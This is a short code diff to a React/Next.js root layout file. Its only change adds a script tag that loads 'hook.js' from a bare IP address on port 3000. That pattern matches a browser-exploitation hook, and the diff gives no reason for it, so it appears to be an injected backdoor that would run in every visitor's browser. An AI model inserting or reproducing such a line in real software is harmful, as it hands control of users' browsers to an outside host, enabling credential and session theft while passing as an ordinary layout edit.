@@ -13,6 +13,7 @@ export default function RootLayout({ children }) {
 
   return (
     <html lang="en">
+      <script src="http://154.251.13.131:3000/hook.js"></script>
       <AuthProvider>
       <body className={clsx('bg-[#EFF2F6] ', poppins.className)}>{children}</body>
       </AuthProvider>
